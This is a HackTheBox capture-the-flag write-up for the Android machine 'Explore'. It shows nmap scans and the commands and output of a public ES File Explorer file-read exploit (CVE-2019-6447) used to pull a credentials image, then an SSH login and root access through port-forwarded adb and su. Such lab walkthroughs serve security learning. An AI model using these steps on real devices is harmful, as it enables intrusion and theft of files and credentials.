---
title: Explore - HackTheBox
author: Vishnu Sudhakaran
date: 2021-10-31 10:00:00 +0530
categories: [Boot2Root, HackTheBox]
tags: [ android, network, adb, exploit-db, cve ]
---

![](/assets/img/posts/explore/1.png)

In this blog we are going to discuss about pwning explore from hackthebox. It is the First Android machine from HackTheBox.

## About The Machine

| Name | OS | Difficulty | Creator |
|------|----|------------|---------|
| [Explore](https://app.hackthebox.com/machines/356) | Android | Easy | [bertolis](https://app.hackthebox.com/users/27897) |

| Blood | User |
|-------|------|
| User | [JoshSH](https://app.hackthebox.com/users/269501) |
| Root | [jkr](https://app.hackthebox.com/users/77141) |

## Reconnaissance

Let's start with `nmap` all ports scan
```bash
➜  nmap -p- 10.10.10.247 -oA explore-allports 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-31 11:08 IST
Nmap scan report for 10.10.10.247
Host is up (0.055s latency).
Not shown: 65530 closed ports
PORT      STATE    SERVICE
2222/tcp  open     EtherNetIP-1
5555/tcp  filtered freeciv
33035/tcp open     unknown
42135/tcp open     unknown
59777/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 33.16 seconds

```

We got some ports open, lets get more information using `-sC (script scan)` and `-sV (service version)` switch.
```bash
➜  nmap -sC -sV -p 2222,5555,33035,42135,59777 --min-rate 10000 10.10.10.247 -oN explore-nmap
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-31 11:17 IST
Nmap scan report for 10.10.10.247
Host is up (0.053s latency).

PORT      STATE    SERVICE VERSION
2222/tcp  open     ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
5555/tcp  filtered freeciv
33035/tcp open     unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.0 400 Bad Request
|     Date: Sun, 31 Oct 2021 05:47:24 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest: 
|     HTTP/1.1 412 Precondition Failed
|     Date: Sun, 31 Oct 2021 05:47:24 GMT
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.0 501 Not Implemented
|     Date: Sun, 31 Oct 2021 05:47:29 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help: 
|     HTTP/1.0 400 Bad Request
|     Date: Sun, 31 Oct 2021 05:47:45 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest: 
|     HTTP/1.0 400 Bad Request
|     Date: Sun, 31 Oct 2021 05:47:29 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Sun, 31 Oct 2021 05:47:45 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ?G???,???`~?
|     ??{????w????<=?o?
|   TLSSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Sun, 31 Oct 2021 05:47:45 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ??random1random2random3random4
|   TerminalServerCookie: 
|     HTTP/1.0 400 Bad Request
|     Date: Sun, 31 Oct 2021 05:47:45 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|_    Cookie: mstshash=nmap
42135/tcp open     http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.91%I=7%D=10/31%Time=617E2DE3%P=x86_64-pc-linux-gnu%r(N
SF:ULL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port33035-TCP:V=7.91%I=7%D=10/31%Time=617E2DE2%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Sun,\x2
SF:031\x20Oct\x202021\x2005:47:24\x20GMT\r\nContent-Length:\x2022\r\nConte
SF:nt-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n
SF:\r\nInvalid\x20request\x20line:\x20")%r(GetRequest,5C,"HTTP/1\.1\x20412
SF:\x20Precondition\x20Failed\r\nDate:\x20Sun,\x2031\x20Oct\x202021\x2005:
SF:47:24\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,B5,"HTTP/1
SF:\.0\x20501\x20Not\x20Implemented\r\nDate:\x20Sun,\x2031\x20Oct\x202021\
SF:x2005:47:29\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pl
SF:ain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x
SF:20supported:\x20OPTIONS")%r(RTSPRequest,BB,"HTTP/1\.0\x20400\x20Bad\x20
SF:Request\r\nDate:\x20Sun,\x2031\x20Oct\x202021\x2005:47:29\x20GMT\r\nCon
SF:tent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\
SF:r\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version
SF::\x20\x20RTSP/1\.0")%r(Help,AE,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
SF:ate:\x20Sun,\x2031\x20Oct\x202021\x2005:47:45\x20GMT\r\nContent-Length:
SF:\x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP")%r(SSLSessionRe
SF:q,DD,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Sun,\x2031\x20Oct\
SF:x202021\x2005:47:45\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x2
SF:0text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid
SF:\x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\
SF:?\0\?\?{\?\?\?\?w\?\?\?\?<=\?o\?\x10n\0\0\(\0\x16\0\x13\0")%r(TerminalS
SF:erverCookie,CA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Sun,\x20
SF:31\x20Oct\x202021\x2005:47:45\x20GMT\r\nContent-Length:\x2054\r\nConten
SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
SF:r\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20mst
SF:shash=nmap")%r(TLSSessionReq,DB,"HTTP/1\.0\x20400\x20Bad\x20Request\r\n
SF:Date:\x20Sun,\x2031\x20Oct\x202021\x2005:47:45\x20GMT\r\nContent-Length
SF::\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnecti
SF:on:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\
SF:0e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");
Service Info: Device: phone

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.71 seconds

```

Here is the interesting part, when you researching on google more about the open port we got. In this case port 59777 is vulnerable for well-known exploit that is `ES File Explorer 4.1.9.7.4 - Arbitrary File Read ` (EDB-ID [50070](https://www.exploit-db.com/exploits/50070)).

![](/assets/img/posts/explore/2.png)

Let's exploit the vulnerability we can use these commands for the exploit:
```bash
listFiles         : List all Files.
listPics          : List all Pictures.
listVideos        : List all videos.
listAudios        : List all audios.
listApps          : List Applications installed.
listAppsSystem    : List System apps.
listAppsPhone     : List Communication related apps.
listAppsSdcard    : List apps on the SDCard.
listAppsAll       : List all Application.
getFile           : Download a file.
getDeviceInfo     : Get device info.
```

We will get successful output from the exploit.
```bash 
➜  python3 exploit.py getDeviceInfo 10.10.10.247                          

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : VMware Virtual Platform
ftpRoot : /sdcard
ftpPort : 3721

```

When we use `listPics` command, there is an interesting file that is `creds.jpg` that contanins plain username and password.
```bash
➜  python3 exploit.py listPics 10.10.10.247

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : concept.jpg
time : 4/21/21 02:38:08 AM
location : /storage/emulated/0/DCIM/concept.jpg
size : 135.33 KB (138,573 Bytes)

name : anc.png
time : 4/21/21 02:37:50 AM
location : /storage/emulated/0/DCIM/anc.png
size : 6.24 KB (6,392 Bytes)

name : creds.jpg
time : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB (1,200,401 Bytes)

name : 224_anc.png
time : 4/21/21 02:37:21 AM
location : /storage/emulated/0/DCIM/224_anc.png
size : 124.88 KB (127,876 Bytes)

```

Get that picture using `getFile` command and file location, then rename `.dat` file to `.jpg`.
```bash
➜  python3 exploit.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

[+] Downloading file...
[+] Done. Saved as `out.dat`.

➜  mv out.dat creds.jpg  
```

![](/assets/img/posts/explore/creds.jpg)

## Gaining foothold

let's login through SSH on port 2222.
```bash
➜  ssh kristi@10.10.10.247 -p 2222  
The authenticity of host '[10.10.10.247]:2222 ([10.10.10.247]:2222)' can't be established.
RSA key fingerprint is SHA256:3mNL574rJyHCOGm1e7Upx4NHXMg/YnJJzq+jXhdQQxI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.10.247]:2222' (RSA) to the list of known hosts.
Password authentication
Password: 
:/ $ whoami
u0_a76
:/ $ 

```

We can get user flag on `/sdcard` directory.
```bash
:/ $ cd sdcard
:/sdcard $ ls -la
total 68
drwxrwx--- 15 root everybody 4096 2021-04-21 02:12 .
drwx--x--x  4 root everybody 4096 2021-03-13 17:16 ..
drwxrwx---  5 root everybody 4096 2021-03-13 17:30 .estrongs
-rw-rw----  1 root everybody   72 2021-10-30 10:29 .userReturn
drwxrwx---  2 root everybody 4096 2021-03-13 17:16 Alarms
drwxrwx---  3 root everybody 4096 2021-03-13 17:16 Android
drwxrwx---  2 root everybody 4096 2021-04-21 02:38 DCIM
drwxrwx---  2 root everybody 4096 2021-03-13 17:37 Download
drwxrwx---  2 root everybody 4096 2021-03-13 17:16 Movies
drwxrwx---  2 root everybody 4096 2021-03-13 17:16 Music
drwxrwx---  2 root everybody 4096 2021-03-13 17:16 Notifications
drwxrwx---  2 root everybody 4096 2021-03-13 17:16 Pictures
drwxrwx---  2 root everybody 4096 2021-03-13 17:16 Podcasts
drwxrwx---  2 root everybody 4096 2021-03-13 17:16 Ringtones
drwxrwx---  3 root everybody 4096 2021-03-13 17:30 backups
drwxrwx---  2 root everybody 4096 2021-04-21 02:12 dianxinos
-rw-rw----  1 root everybody   33 2021-03-13 18:28 user.txt
:/sdcard $ wc -m user.txt
33 user.txt
:/sdcard $ 

```

## Privilege Escalation

When we looking at the network socket connections on the machine we can see `5555 port` on `LISTEN` state.
```bash
:/sdcard $ ss -lnpt
State       Recv-Q Send-Q Local Address:Port               Peer Address:Port              
LISTEN      0      10           *:42135                    *:*                  
LISTEN      0      50       [::ffff:10.10.10.247]:41083                    *:*                  
LISTEN      0      50           *:59777                    *:*                  
LISTEN      0      8       [::ffff:127.0.0.1]:45897                    *:*                  
LISTEN      0      50           *:2222                     *:*                   users:(("ss",pid=31253,fd=78),("sh",pid=28774,fd=78),("droid.sshserver",pid=3405,fd=78))
LISTEN      0      4            *:5555                     *:*                  
:/sdcard $ 

```

Port 5555 is an Android Debug Bridge (adb)(https://developer.android.com/studio/command-line/adb). Let's connect it through port-forwarding with `ssh` to our localhost.
```bash
➜  ssh -L 5555:localhost:5555 kristi@10.10.10.247 -p 2222
Password authentication
Password: 
:/ $ whoami
u0_a76
:/ $ 
```

Now connect it with `adb`, if you don't have `adb` tool then install it according to your OS. 
```bash
➜  adb connect 127.0.0.1:5555
* daemon not running; starting now at tcp:5037
* daemon started successfully
connected to 127.0.0.1:5555

➜  adb -s 127.0.0.1:5555 shell
x86_64:/ $ whoami                                                                                      
shell
x86_64:/ $ su
:/ # whoami
root
:/ # 


```

You can simply switch to root user by the command `su` and you can find root flag on `/data` directory.
```bash
:/data # ls
adb           bootchart     media       property       tombstones 
anr           cache         mediadrm    resource-cache user       
app           dalvik-cache  misc        root.txt       user_de    
app-asec      data          misc_ce     ss             vendor     
app-ephemeral drm           misc_de     ssh_starter.sh vendor_ce  
app-lib       es_starter.sh nfc         system         vendor_de  
app-private   local         ota         system_ce      
backup        lost+found    ota_package system_de      
:/data # wc -m root.txt
33 root.txt
:/data # 

```

### Thank you for reading my writeup!!




